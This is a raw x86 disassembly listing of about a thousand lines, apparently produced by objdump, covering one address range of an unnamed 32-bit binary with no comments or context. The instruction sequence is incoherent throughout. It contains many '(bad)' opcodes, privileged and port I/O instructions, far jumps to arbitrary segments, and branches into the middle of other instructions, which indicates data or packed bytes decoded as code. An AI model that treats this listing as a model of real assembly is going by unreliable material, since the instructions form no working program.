  40da77:	arpl   WORD PTR ds:0x11b8c200,ax
  40da7d:	lods   al,BYTE PTR ds:[esi]
  40da7e:	adc    ch,BYTE PTR [eax]
  40da80:	add    BYTE PTR [edx],0xdf
  40da83:	retf   0xb7ed
  40da86:	jl     0x40da46
  40da88:	and    BYTE PTR [esp+esi*2+0x7f],0xc6
  40da8d:	sub    BYTE PTR [eax],cl
  40da8f:	bound  edi,QWORD PTR [ecx]
  40da91:	cli    
  40da92:	sbb    DWORD PTR [ecx-0x35b6710d],ebx
  40da98:	int    0x45
  40da9a:	mov    esp,0x45316618
  40da9f:	stc    
  40daa0:	mov    ebx,0x7989eb76
  40daa5:	jecxz  0x40da47
  40daa7:	into   
  40daa8:	sbb    DWORD PTR [ecx+edi*4-0x282ca9ea],0x14
  40dab0:	push   edx
  40dab1:	inc    edi
  40dab2:	jmp    0x5ce1:0x8d13e635
  40dab9:	jno    0x40daaa
  40dabb:	rol    BYTE PTR [esi-0x3388502a],cl
  40dac1:	xchg   esp,eax
  40dac2:	add    DWORD PTR [esi],eax
  40dac4:	sbb    DWORD PTR [esi-0x75],edx
  40dac7:	in     al,dx
  40dac8:	ds mov al,0x6f
  40dacb:	xchg   esi,edx
  40dacd:	popa   
  40dace:	fwait
  40dacf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dad0:	jle    0x40db4c
  40dad2:	sub    dl,bl
  40dad4:	pop    es
  40dad5:	test   DWORD PTR ds:0xf2c4b0f2,0xc5b5ecf1
  40dadf:	mov    BYTE PTR [edx+0xc],0xe0
  40dae3:	js     0x40dae4
  40dae5:	pop    es
  40dae6:	adc    eax,0x7f31d13
  40daeb:	ret    0x3650
  40daee:	loop   0x40dab3
  40daf0:	loopne 0x40db1a
  40daf2:	test   BYTE PTR [edi],bh
  40daf4:	sbb    al,0xb6
  40daf6:	dec    esp
  40daf7:	xchg   edx,eax
  40daf8:	test   eax,0xdd6c5da6
  40dafd:	iret   
  40dafe:	clc    
  40daff:	rcr    al,1
  40db01:	pop    edx
  40db02:	aam    0x3d
  40db04:	es pop esp
  40db06:	pop    esi
  40db07:	push   0x27
  40db09:	fimul  DWORD PTR [edi+0x52]
  40db0c:	xor    DWORD PTR [ebx-0x6f],ebp
  40db0f:	aad    0x6
  40db11:	cmp    bl,al
  40db13:	sub    eax,eax
  40db15:	scas   al,BYTE PTR es:[edi]
  40db16:	inc    esp
  40db17:	das    
  40db18:	or     ah,BYTE PTR [edx+0x2]
  40db1b:	clc    
  40db1c:	cmp    eax,0x1db04890
  40db21:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40db23:	popa   
  40db24:	ret    
  40db25:	scas   al,BYTE PTR es:[edi]
  40db26:	das    
  40db27:	or     dh,dh
  40db29:	cs into 
  40db2b:	out    0xcd,al
  40db2d:	shl    esp,cl
  40db2f:	jecxz  0x40db4e
  40db31:	cmp    bl,BYTE PTR [ebp+esi*8+0x7]
  40db35:	sbb    DWORD PTR [edi+0x2a],edx
  40db38:	jno    0x40db0e
  40db3a:	aad    0x7c
  40db3c:	xchg   ecx,eax
  40db3d:	leave  
  40db3e:	cmp    eax,0xa595fc8e
  40db43:	xor    DWORD PTR ds:0x716801d8,0x7e55e372
  40db4d:	jle    0x40db52
  40db4f:	(bad)  
  40db50:	jge    0x40dafb
  40db52:	lahf   
  40db53:	test   al,0x9d
  40db55:	dec    BYTE PTR [eax-0x356f6f85]
  40db5b:	and    bh,ch
  40db5d:	scas   al,BYTE PTR es:[edi]
  40db5e:	jo     0x40db51
  40db60:	cmp    al,0xc5
  40db62:	mov    al,BYTE PTR [ecx]
  40db64:	scas   al,BYTE PTR es:[edi]
  40db65:	add    dl,BYTE PTR [ecx-0x18]
  40db68:	cmp    BYTE PTR [ecx],bl
  40db6a:	sbb    eax,DWORD PTR [ebx+0x70]
  40db6d:	lock ror ecx,0xf1
  40db71:	add    bh,BYTE PTR [esi-0x255e8110]
  40db77:	inc    ebx
  40db78:	xor    DWORD PTR [ebp+ebx*4-0x3b],esp
  40db7c:	cmp    al,dh
  40db7e:	shr    BYTE PTR [ebx],1
  40db80:	add    BYTE PTR [ebp-0x20],al
  40db83:	outs   dx,BYTE PTR ds:[esi]
  40db84:	or     al,0x74
  40db86:	dec    edi
  40db87:	push   0x4328de0a
  40db8c:	bound  esp,QWORD PTR [edx+ebx*2-0x28]
  40db90:	(bad)  
  40db91:	nop    esp
  40db94:	ins    BYTE PTR es:[edi],dx
  40db95:	loopne 0x40db3e
  40db97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db98:	mov    BYTE PTR [ecx-0x101c1136],ah
  40db9e:	sbb    ah,al
  40dba0:	push   ebx
  40dba1:	dec    ebx
  40dba2:	sti    
  40dba3:	aam    0x18
  40dba5:	nop
  40dba6:	push   ebp
  40dba7:	scas   eax,DWORD PTR es:[edi]
  40dba8:	fld    QWORD PTR [ecx]
  40dbaa:	cs mov ebp,0x9f521dcb
  40dbb0:	mov    BYTE PTR [edx+ebx*4-0x68],al
  40dbb4:	inc    edi
  40dbb5:	ja     0x40db96
  40dbb7:	adc    eax,DWORD PTR [esp+ecx*8+0x6ba20fe4]
  40dbbe:	cmp    al,0x42
  40dbc0:	or     DWORD PTR [eax+0x59d00050],0xd9e7ec9f
  40dbca:	ds push ds
  40dbcc:	push   ecx
  40dbcd:	or     dh,bl
  40dbcf:	pop    ebx
  40dbd0:	or     BYTE PTR [edi+0x2046e2a1],0x9e
  40dbd7:	in     eax,0x13
  40dbd9:	es push esp
  40dbdb:	fsubrp st(0),st
  40dbdd:	mov    ds:0x910fcacf,eax
  40dbe2:	(bad)  
  40dbe3:	jnp    0x40dbeb
  40dbe5:	xor    ch,BYTE PTR [ebx+0x7b]
  40dbe8:	jns    0x40db9a
  40dbea:	je     0x40dc11
  40dbec:	(bad)  
  40dbed:	pop    ecx
  40dbee:	imul   esi,DWORD PTR [ecx+ecx*2+0x215b966b],0xfffffff5
  40dbf6:	retf   0x872f
  40dbf9:	jmp    0x40dc24
  40dbfb:	mov    eax,ds:0xa5721833
  40dc00:	(bad)  
  40dc01:	out    dx,al
  40dc02:	sbb    al,0xd1
  40dc04:	sub    BYTE PTR [eax+0x44],bl
  40dc07:	xchg   ebp,eax
  40dc08:	sub    ebx,DWORD PTR [ebx+0x64]
  40dc0b:	xchg   BYTE PTR [ebp+eiz*4+0x443e087a],dl
  40dc12:	jle    0x40dc79
  40dc14:	add    eax,0x23862498
  40dc19:	fimul  DWORD PTR [ebx]
  40dc1b:	mov    dl,0xea
  40dc1d:	ins    BYTE PTR es:[edi],dx
  40dc1e:	push   ecx
  40dc1f:	sbb    DWORD PTR [ebx],0xb4853833
  40dc25:	cmp    bl,dl
  40dc27:	fimul  WORD PTR [eax+ebx*2+0x31003d74]
  40dc2e:	jnp    0x40dc24
  40dc30:	pop    es
  40dc31:	push   ebx
  40dc32:	imul   edi,DWORD PTR [esi-0x6f],0x9353695f
  40dc39:	add    eax,0x2cdf59f6
  40dc3e:	mov    cl,0x3a
  40dc40:	mov    bl,0x38
  40dc42:	push   es
  40dc43:	fiadd  DWORD PTR [ebp+0x73]
  40dc46:	dec    esi
  40dc47:	dec    edx
  40dc48:	les    esp,FWORD PTR [ebx+0x4efb017]
  40dc4e:	sub    eax,0xde3b4b96
  40dc53:	call   0x5313cc03
  40dc58:	retf   
  40dc59:	in     al,0x3a
  40dc5b:	and    al,0x1f
  40dc5d:	call   0xa884dfff
  40dc62:	mov    ebp,DWORD PTR [edx]
  40dc64:	shl    DWORD PTR [edi],0x56
  40dc67:	or     BYTE PTR [esi],cl
  40dc69:	in     eax,dx
  40dc6a:	xchg   dh,ah
  40dc6c:	mov    bl,0xac
  40dc6e:	enter  0xe931,0xd5
  40dc72:	adc    DWORD PTR [edi+0x7e63ac55],edi
  40dc78:	pop    ebx
  40dc79:	pop    ebp
  40dc7a:	lea    esp,[edi+0x1e364dd1]
  40dc80:	(bad)  
  40dc81:	enter  0x1288,0xbd
  40dc85:	pop    eax
  40dc86:	and    bl,BYTE PTR [ecx]
  40dc88:	push   ds
  40dc89:	(bad)  
  40dc8a:	idiv   BYTE PTR ds:0x8c89392a
  40dc90:	add    al,bl
  40dc92:	loopne 0x40dd0c
  40dc94:	dec    esi
  40dc95:	repz sub al,0x15
  40dc98:	pusha  
  40dc99:	dec    ecx
  40dc9a:	loope  0x40dccb
  40dc9c:	sbb    DWORD PTR [esp+ebp*4-0xc3b495e],0x8e686df8
  40dca7:	stos   BYTE PTR es:[edi],al
  40dca8:	imul   edi,DWORD PTR [edx+0x4bc12538],0xbd52841e
  40dcb2:	push   0x26
  40dcb4:	or     ch,dl
  40dcb6:	xchg   ebp,eax
  40dcb7:	fdiv   st(1),st
  40dcb9:	mov    ebx,0x90ed5eb7
  40dcbe:	test   DWORD PTR [ebp-0x9],esi
  40dcc1:	pop    ecx
  40dcc2:	inc    BYTE PTR [ecx-0x3f]
  40dcc5:	pop    ss
  40dcc6:	in     eax,dx
  40dcc7:	xchg   ecx,eax
  40dcc8:	pop    eax
  40dcc9:	retf   
  40dcca:	xor    DWORD PTR [eax-0x72b6abee],esp
  40dcd0:	cmp    bl,bl
  40dcd2:	fcomp  QWORD PTR [edx+0x2a]
  40dcd5:	mov    esi,0x179f361c
  40dcda:	rol    BYTE PTR [ebx],cl
  40dcdc:	pop    ss
  40dcdd:	mov    ebx,0xc68f17e5
  40dce2:	push   0x794f89e7
  40dce7:	fsub   DWORD PTR ds:0x27ffc74d
  40dced:	xor    esp,DWORD PTR [ebx]
  40dcef:	xor    ecx,esp
  40dcf1:	and    DWORD PTR [eax],edx
  40dcf3:	jmp    0x40dd15
  40dcf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcf6:	int    0xc7
  40dcf8:	lahf   
  40dcf9:	stc    
  40dcfa:	mov    ch,0xc8
  40dcfc:	or     al,0x94
  40dcfe:	xchg   ebx,eax
  40dcff:	jecxz  0x40dd42
  40dd01:	inc    ebx
  40dd02:	mov    ah,0x88
  40dd04:	mov    ah,0x2d
  40dd06:	xor    eax,0x1b9b3084
  40dd0b:	mov    cl,0xe0
  40dd0d:	ins    BYTE PTR es:[edi],dx
  40dd0e:	mov    dl,0xf6
  40dd10:	mov    eax,ds:0x3fa17b7f
  40dd15:	push   ebx
  40dd16:	or     eax,0xca9f4419
  40dd1b:	ja     0x40dcb7
  40dd1d:	push   ebp
  40dd1e:	loop   0x40dd0f
  40dd20:	call   0x369f2a7c
  40dd25:	xchg   edi,eax
  40dd27:	jnp    0x40dcba
  40dd29:	fcmovnb st,st(3)
  40dd2b:	jmp    0x40dd03
  40dd2d:	ret    
  40dd2e:	mov    ds:0x8319c044,al
  40dd33:	fidiv  WORD PTR [esi+0x2d]
  40dd36:	and    bh,bl
  40dd38:	or     DWORD PTR [eax-0x6],edx
  40dd3b:	xchg   edx,eax
  40dd3c:	call   0x135e:0x458cec2c
  40dd43:	ret    0x1681
  40dd46:	cmp    eax,0x36d84a53
  40dd4b:	imul   dh
  40dd4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd4e:	repnz enter 0x230,0x74
  40dd53:	out    dx,eax
  40dd54:	add    al,0xf7
  40dd56:	mov    eax,ds:0x7a83da1c
  40dd5b:	mov    dl,cl
  40dd5d:	test   DWORD PTR [ebx],0x85d2dded
  40dd63:	dec    eax
  40dd64:	stc    
  40dd65:	loopne 0x40dcf5
  40dd67:	mov    ds:0x59b4837d,al
  40dd6c:	push   ebx
  40dd6d:	or     ebx,DWORD PTR [ebx]
  40dd6f:	(bad)  
  40dd70:	mov    esp,0x48277008
  40dd75:	push   0x74
  40dd77:	lea    edi,ds:0x4a14bca
  40dd7d:	in     eax,0xe4
  40dd7f:	test   BYTE PTR [ebp-0x39f21a55],0xf6
  40dd86:	inc    edx
  40dd87:	fist   WORD PTR [eax]
  40dd89:	xor    ecx,DWORD PTR ds:0xf5de6405
  40dd8f:	lahf   
  40dd90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd91:	mov    dl,0xa5
  40dd93:	mov    ss,WORD PTR [eax]
  40dd95:	scas   eax,DWORD PTR es:[edi]
  40dd96:	sbb    DWORD PTR [esi-0x3451388f],edx
  40dd9c:	xchg   DWORD PTR ds:0xb80f1ffc,esi
  40dda2:	in     al,dx
  40dda3:	add    esi,DWORD PTR [ebx-0x310ee0b5]
  40dda9:	push   ebp
  40ddaa:	into   
  40ddab:	xchg   esp,eax
  40ddac:	int    0xaa
  40ddae:	inc    esp
  40ddaf:	inc    ebp
  40ddb0:	mov    cl,BYTE PTR [edx+0x2b4d219e]
  40ddb6:	les    eax,FWORD PTR [edx]
  40ddb8:	ins    DWORD PTR es:[edi],dx
  40ddb9:	mov    bl,0xaa
  40ddbb:	repnz sub DWORD PTR [esi+0x75],esi
  40ddbf:	inc    ebx
  40ddc0:	scas   eax,DWORD PTR es:[edi]
  40ddc1:	mov    ebp,0x4033175f
  40ddc6:	jmp    0x40dd5b
  40ddc8:	dec    edi
  40ddc9:	imul   esp,ebp,0xffffffe3
  40ddcc:	add    BYTE PTR [esi+0x644006ef],dh
  40ddd2:	cmp    al,ch
  40ddd4:	dec    ecx
  40ddd5:	xor    eax,0xb1be5a29
  40ddda:	mov    dh,0x83
  40dddc:	pop    edi
  40dddd:	mov    dl,0xd0
  40dddf:	inc    ebx
  40dde0:	pop    esi
  40dde1:	push   eax
  40dde2:	std    
  40dde3:	icebp  
  40dde4:	push   edi
  40dde5:	jge    0x40de2e
  40dde7:	pop    es
  40dde8:	xor    ax,0xcfd3
  40ddec:	es cld 
  40ddee:	add    ecx,DWORD PTR [ebp-0x4f]
  40ddf1:	or     DWORD PTR [edi+0x75391449],0x58ce0f62
  40ddfb:	inc    edi
  40ddfc:	mov    bl,0x9c
  40ddfe:	rol    BYTE PTR [ebp+0x1d],cl
  40de01:	sub    eax,0xca834990
  40de06:	in     al,0xe7
  40de08:	mov    WORD PTR [eax-0x2d],gs
  40de0b:	adc    al,0x1f
  40de0d:	or     BYTE PTR [ecx],ah
  40de0f:	cmp    ch,BYTE PTR [eax*1+0x7f0bcfa6]
  40de16:	shl    DWORD PTR [edx+0x6b],1
  40de19:	inc    eax
  40de1a:	mov    ds:0x7002a11b,eax
  40de1f:	test   BYTE PTR [edx-0x1e],cl
  40de22:	out    0xf6,eax
  40de24:	std    
  40de25:	adc    BYTE PTR [ebp+0x6db347eb],bl
  40de2b:	pop    esp
  40de2c:	inc    edx
  40de2d:	gs clc 
  40de2f:	jle    0x40dea7
  40de31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de32:	mov    BYTE PTR [eax],0xa3
  40de35:	cmp    DWORD PTR [esi+0x76],ecx
  40de38:	or     edi,eax
  40de3a:	out    0xf7,eax
  40de3c:	lahf   
  40de3d:	xor    BYTE PTR [eax+edi*2],al
  40de40:	inc    ebp
  40de41:	jge    0x40de0f
  40de43:	hlt    
  40de44:	iret   
  40de45:	push   esi
  40de46:	dec    ecx
  40de47:	xchg   esp,eax
  40de48:	sub    eax,0xc2d5349d
  40de4d:	add    al,0xe7
  40de4f:	(bad)  
  40de50:	popa   
  40de51:	adc    DWORD PTR [ebx+ecx*1],eax
  40de54:	jmp    0x40de63
  40de56:	fbstp  TBYTE PTR [ebx]
  40de58:	out    dx,al
  40de59:	push   esi
  40de5a:	dec    edi
  40de5b:	adc    DWORD PTR es:[eax-0x2ee5ba9a],esi
  40de62:	adc    eax,0xd325df15
  40de67:	add    al,0x6d
  40de69:	cmp    eax,0x1c8d7922
  40de6e:	shl    DWORD PTR [edx+0x31],cl
  40de71:	lock adc al,0x13
  40de74:	push   edx
  40de75:	in     al,0x79
  40de77:	sbb    DWORD PTR [edx+0x1e],edi
  40de7a:	push   ss
  40de7b:	sahf   
  40de7c:	fild   WORD PTR [edx-0x3d5fe8eb]
  40de82:	nop
  40de83:	adc    al,0x7
  40de85:	jns    0x40dee7
  40de87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de88:	out    dx,al
  40de89:	bound  edx,QWORD PTR [eax]
  40de8b:	outs   dx,DWORD PTR ds:[esi]
  40de8c:	xor    al,0x4b
  40de8e:	jno    0x40de37
  40de90:	mov    WORD PTR [esi],gs
  40de92:	or     DWORD PTR [ebx],esp
  40de94:	add    al,0x18
  40de96:	cdq    
  40de97:	in     eax,dx
  40de98:	cmp    ebp,DWORD PTR [edx]
  40de9a:	popa   
  40de9b:	(bad)  
  40de9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de9d:	cmp    bh,dl
  40de9f:	jle    0x40de5b
  40dea1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dea2:	xchg   edi,eax
  40dea3:	push   ss
  40dea4:	outs   dx,DWORD PTR ds:[esi]
  40dea5:	inc    ecx
  40dea6:	(bad)  
  40dea7:	push   ebp
  40dea8:	xlat   BYTE PTR ds:[ebx]
  40dea9:	xor    ebx,ebx
  40deab:	cmp    esi,edx
  40dead:	xor    eax,eax
  40deaf:	cmc    
  40deb0:	ret    0x42f8
  40deb3:	mov    ch,0x40
  40deb5:	das    
  40deb6:	sub    DWORD PTR ds:0x3fc67e3,edx
  40debc:	mov    ds:0x29a72368,al
  40dec1:	adc    ebp,DWORD PTR [ecx-0x27]
  40dec4:	mov    ecx,0xe7ff107e
  40dec9:	dec    ecx
  40deca:	imul   eax,esi,0x25835c27
  40ded0:	mov    al,ds:0x3c3a45fc
  40ded5:	add    eax,DWORD PTR [eax]
  40ded7:	repnz sub DWORD PTR [edi-0x64],0x86ec3dc8
  40dedf:	ret    
  40dee0:	loope  0x40def0
  40dee2:	mov    esp,0xf4a13f9b
  40dee7:	inc    ebp
  40dee8:	lahf   
  40dee9:	sub    BYTE PTR [ebp-0x74108b77],dh
  40deef:	mov    ds:0x43cac727,al
  40def4:	adc    DWORD PTR [ebp+eax*4-0x4e],0xffffffbd
  40def9:	call   0x525d0ee3
  40defe:	cld    
  40deff:	mul    BYTE PTR [ecx+eiz*4]
  40df02:	jmp    0xd5754e68
  40df07:	ret    0x4b40
  40df0a:	(bad)  
  40df0b:	cmp    edi,DWORD PTR [ebx+0x70d78784]
  40df11:	inc    edi
  40df12:	dec    esi
  40df13:	inc    eax
  40df14:	jnp    0x40deb0
  40df16:	mov    WORD PTR [ecx],?
  40df18:	das    
  40df19:	push   es
  40df1a:	fist   WORD PTR [edi+0x3872ce1d]
  40df20:	stos   DWORD PTR es:[edi],eax
  40df21:	add    eax,0x648b6bc2
  40df26:	push   es
  40df27:	dec    ecx
  40df28:	loopne 0x40df8b
  40df2a:	push   ds
  40df2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df2c:	(bad)  
  40df2d:	cdq    
  40df2e:	dec    edi
  40df2f:	mov    ds:0x9dd719ca,al
  40df34:	mov    edi,0x9eb172bf
  40df39:	adc    BYTE PTR [esi+0x26],cl
  40df3c:	mov    ?,WORD PTR [edi-0x65]
  40df3f:	and    DWORD PTR [eax+0x469ac905],ebp
  40df45:	fsub   QWORD PTR [ebx-0x19]
  40df48:	fistp  WORD PTR [ebx-0x6e]
  40df4b:	ss scas al,BYTE PTR es:[edi]
  40df4d:	or     BYTE PTR [ebx+0x4d6a22a5],al
  40df53:	fiadd  WORD PTR [eax+0x146119d]
  40df59:	mov    eax,0xb17edc42
  40df5e:	push   0xf2a8667c
  40df63:	shl    DWORD PTR [ecx+ebx*8-0x233ddd55],1
  40df6a:	dec    esi
  40df6b:	(bad)  
  40df6c:	adc    eax,ecx
  40df6e:	or     al,0x76
  40df70:	push   edi
  40df71:	mov    WORD PTR [edx-0x47574054],cs
  40df77:	jo     0x40df9d
  40df79:	popa   
  40df7a:	mov    ch,0x8b
  40df7c:	inc    ebx
  40df7d:	cli    
  40df7e:	pop    ecx
  40df7f:	and    cl,al
  40df81:	enter  0x7d10,0xe8
  40df85:	int3   
  40df86:	and    al,0x1b
  40df88:	das    
  40df89:	inc    edx
  40df8a:	iret   
  40df8b:	push   edi
  40df8c:	push   ecx
  40df8d:	ja     0x40dfc3
  40df8f:	mov    cl,0x77
  40df91:	test   al,0x66
  40df93:	cmp    eax,0xd51ad32
  40df98:	lods   eax,DWORD PTR ds:[esi]
  40df99:	and    BYTE PTR [ebp-0x5019f6f4],0x0
  40dfa0:	or     BYTE PTR [ebx+0x5a2af284],al
  40dfa6:	fisubr DWORD PTR [eax-0x25]
  40dfa9:	add    DWORD PTR [esi],ebp
  40dfab:	out    0xe5,al
  40dfad:	pop    ds
  40dfae:	push   edi
  40dfaf:	inc    ebp
  40dfb0:	leave  
  40dfb1:	inc    ebx
  40dfb2:	outs   dx,BYTE PTR ds:[esi]
  40dfb3:	out    0x85,al
  40dfb5:	and    al,0xdb
  40dfb7:	jg     0x40dfde
  40dfb9:	dec    esi
  40dfba:	and    al,0xce
  40dfbc:	fsincos 
  40dfbf:	mov    WORD PTR [edx-0x5bfb77c1],gs
  40dfc5:	mov    ah,BYTE PTR [ebp+0x4fe1828]
  40dfcb:	pop    esi
  40dfcc:	jmp    DWORD PTR [ecx-0x56f5d435]
  40dfd2:	mov    ebx,0xb85def5c
  40dfd7:	leave  
  40dfd8:	popa   
  40dfd9:	ins    DWORD PTR es:[edi],dx
  40dfda:	lahf   
  40dfdb:	pop    ds
  40dfdc:	and    eax,0x3f017203
  40dfe1:	fiadd  DWORD PTR [eax]
  40dfe3:	push   edx
  40dfe4:	inc    esi
  40dfe5:	mov    ebx,0xa50c0948
  40dfea:	ret    0x754
  40dfed:	sbb    al,0xa5
  40dfef:	xor    ecx,DWORD PTR [edi+eiz*8-0x76bc1f22]
  40dff6:	iret   
  40dff7:	je     0x40dfc9
  40dff9:	loope  0x40dfe5
  40dffb:	jns    0x40dffc
  40dffd:	or     al,0xc9
  40dfff:	xchg   edi,eax
  40e000:	ret    
  40e001:	mov    fs,WORD PTR [esp+eax*4+0x6407856e]
  40e008:	jnp    0x40dfc5
  40e00a:	xchg   ebx,eax
  40e00b:	sub    DWORD PTR [ecx+0x4dd4a875],ebp
  40e011:	aad    0x4f
  40e013:	or     ebx,DWORD PTR [edx-0x77]
  40e016:	sbb    esi,DWORD PTR [ecx]
  40e018:	mov    cs,edi
  40e01a:	aam    0x5a
  40e01c:	inc    edx
  40e01d:	imul   edi,ebx,0x3487e9e5
  40e023:	sahf   
  40e024:	mov    al,0x20
  40e026:	jp     0x40dfef
  40e028:	stos   DWORD PTR es:[edi],eax
  40e029:	dec    esi
  40e02a:	xchg   esi,eax
  40e02b:	sbb    ecx,DWORD PTR [esi]
  40e02d:	fs dec ebx
  40e02f:	jle    0x40dfcd
  40e031:	cdq    
  40e032:	sbb    al,0x7d
  40e034:	test   al,0xd8
  40e036:	aam    0x9c
  40e038:	push   ecx
  40e039:	enter  0x47c4,0xe
  40e03d:	add    BYTE PTR [ecx-0x2cfc8dc0],bl
  40e043:	loopne 0x40e0c2
  40e045:	jbe    0x40e0ab
  40e047:	push   ecx
  40e048:	int    0xf7
  40e04a:	in     al,0xf5
  40e04c:	add    esi,DWORD PTR [ebx+0x30]
  40e04f:	jo     0x40e07f
  40e051:	stc    
  40e052:	jb     0x40e002
  40e054:	mov    ecx,edx
  40e056:	imul   ebp,DWORD PTR [esi+0x1aebfeb4],0xb20f89e1
  40e060:	dec    edi
  40e061:	push   ebx
  40e062:	enter  0xfdec,0x4a
  40e066:	fs stos BYTE PTR es:[edi],al
  40e068:	out    0x92,al
  40e06a:	repz and edx,DWORD PTR [ecx-0x50]
  40e06e:	inc    edi
  40e06f:	(bad)  
  40e070:	push   eax
  40e071:	adc    bl,BYTE PTR [eax]
  40e073:	inc    ebx
  40e074:	xchg   esp,eax
  40e075:	enter  0x72c6,0x79
  40e079:	sbb    DWORD PTR [ebx+eax*8+0x3ca64a27],ecx
  40e080:	aad    0x79
  40e082:	inc    ebx
  40e083:	daa    
  40e084:	sbb    eax,DWORD PTR [edi+0xf]
  40e087:	lods   al,BYTE PTR ds:[esi]
  40e088:	sub    al,0xd6
  40e08a:	pop    esi
  40e08b:	dec    edi
  40e08c:	inc    esi
  40e08d:	(bad)  
  40e08f:	iret   
  40e090:	je     0x40e0b6
  40e092:	xchg   DWORD PTR [esi-0x54e59323],ebp
  40e098:	(bad)  
  40e099:	fnstsw WORD PTR [ecx-0x46]
  40e09c:	ficom  DWORD PTR [ebx+0x66]
  40e09f:	ret    
  40e0a0:	pop    esi
  40e0a1:	pop    edi
  40e0a2:	and    BYTE PTR [edi+0x1a],cl
  40e0a5:	mov    ch,0x6e
  40e0a8:	sub    eax,0x700509fc
  40e0ad:	inc    esp
  40e0ae:	mov    ch,0xda
  40e0b0:	dec    esi
  40e0b1:	xor    DWORD PTR [eax+edi*8+0x79e8c5bc],0xeea2b3ed
  40e0bc:	mov    dl,0x4
  40e0be:	call   DWORD PTR [ebx-0x76aa3199]
  40e0c4:	xchg   esi,eax
  40e0c5:	popf   
  40e0c6:	lock mov esp,0xc549ae55
  40e0cc:	loop   0x40e077
  40e0ce:	mov    ebp,0x38849220
  40e0d3:	aas    
  40e0d4:	leave  
  40e0d5:	mov    ?,WORD PTR [esi+0x670619cb]
  40e0db:	mov    ah,0x71
  40e0dd:	leave  
  40e0de:	lock stos BYTE PTR es:[edi],al
  40e0e0:	(bad)
  40e0e4:	ja     0x40e06d
  40e0e6:	dec    eax
  40e0e7:	add    dl,al
  40e0e9:	popa   
  40e0ea:	or     DWORD PTR [edx-0x287585d7],edx
  40e0f0:	dec    ebp
  40e0f1:	(bad)  
  40e0f2:	xchg   edi,eax
  40e0f3:	ja     0x40e0a4
  40e0f5:	jmp    0x40e134
  40e0f7:	inc    esp
  40e0f8:	popf   
  40e0f9:	jb     0x40e157
  40e0fb:	jmp    0xd91d5b90
  40e100:	pop    ds
  40e101:	and    al,0xb5
  40e103:	xrelease mov DWORD PTR [eax-0x33],esp
  40e107:	push   es
  40e108:	(bad)  
  40e109:	xchg   BYTE PTR [ebp+0x51d81e8a],ch
  40e10f:	in     eax,dx
  40e110:	(bad)  
  40e111:	xchg   esi,eax
  40e112:	repnz xchg edx,eax
  40e114:	loop   0x40e113
  40e116:	mov    cs,WORD PTR [edi+0x616dcc7d]
  40e11c:	push   ds
  40e11d:	xor    DWORD PTR [ebp+0x4b],0x18
  40e121:	cdq    
  40e122:	add    eax,0x3b7bea4a
  40e127:	push   ebp
  40e128:	pushf  
  40e129:	loope  0x40e18f
  40e12b:	in     eax,0x5c
  40e12d:	(bad)  
  40e12e:	dec    esp
  40e12f:	lds    esp,FWORD PTR [esp+esi*4+0x7937cf76]
  40e136:	cmp    ebx,DWORD PTR [ebp+0x2c]
  40e139:	cdq    
  40e13a:	pop    esi
  40e13b:	clc    
  40e13c:	nop    edi
  40e13f:	lock mov bh,0x68
  40e142:	sbb    al,0x5d
  40e144:	(bad)  [edi-0x5f]
  40e147:	xchg   esi,eax
  40e148:	pop    eax
  40e149:	js     0x40e1be
  40e14b:	mov    ds,WORD PTR [esi]
  40e14d:	fild   DWORD PTR es:[eax-0xc]
  40e151:	mov    ah,0xf2
  40e153:	mov    bh,0x35
  40e155:	mov    bl,0x29
  40e157:	in     al,dx
  40e158:	push   0xffffffb1
  40e15a:	fidiv  WORD PTR [edx+0x60]
  40e15d:	inc    esp
  40e15e:	push   ds
  40e15f:	pop    ss
  40e160:	adc    DWORD PTR [esi],ebp
  40e162:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e163:	out    0x3,al
  40e165:	xor    esi,esi
  40e167:	mov    edi,0x16949c9
  40e16c:	xor    DWORD PTR [ebx-0xf],edx
  40e16f:	rol    DWORD PTR [ebp+eiz*1+0x3eaf4406],1
  40e176:	inc    edx
  40e177:	mov    ah,0xd7
  40e179:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e17a:	scas   al,BYTE PTR es:[edi]
  40e17b:	jmp    0xf95d:0x6df0cd3c
  40e182:	mov    bh,0x11
  40e184:	pop    eax
  40e185:	lea    eax,[eax]
  40e187:	lods   eax,DWORD PTR ds:[esi]
  40e188:	icebp  
  40e189:	leave  
  40e18a:	ins    DWORD PTR es:[edi],dx
  40e18b:	rol    ecx,1
  40e18d:	inc    ebx
  40e18e:	fwait
  40e18f:	stc    
  40e190:	dec    edx
  40e191:	push   ss
  40e192:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e193:	mov    edx,0xe5883441
  40e198:	loop   0x40e177
  40e19a:	test   eax,0x806e2dc6
  40e19f:	mov    bh,0x9a
  40e1a1:	jmp    0x96d:0x8be0860
  40e1a8:	adc    cl,dh
  40e1aa:	popf   
  40e1ab:	jp     0x40e19d
  40e1ad:	mov    edx,0x225630e8
  40e1b2:	dec    ecx
  40e1b3:	jbe    0x40e19f
  40e1b5:	jo     0x40e209
  40e1b7:	or     bl,BYTE PTR [ebx-0xa]
  40e1ba:	test   al,0x53
  40e1bc:	ins    BYTE PTR es:[edi],dx
  40e1bd:	sbb    eax,0x4dbc82c5
  40e1c2:	bound  edx,QWORD PTR [eax+0x32]
  40e1c5:	cmp    eax,DWORD PTR [edi]
  40e1c7:	mov    edx,0x50203c6d
  40e1cc:	ja     0x40e169
  40e1ce:	adc    dh,BYTE PTR [ecx+edi*1-0x2c]
  40e1d2:	mov    edx,0x479ea5cc
  40e1d7:	hlt    
  40e1d8:	aad    0xa1
  40e1da:	mov    esp,0xb1561ef2
  40e1df:	stos   BYTE PTR es:[edi],al
  40e1e0:	add    ebx,ebx
  40e1e2:	mov    esi,0xfe3dd6f9
  40e1e7:	and    DWORD PTR [esi+edx*2-0x43],ecx
  40e1eb:	pop    ss
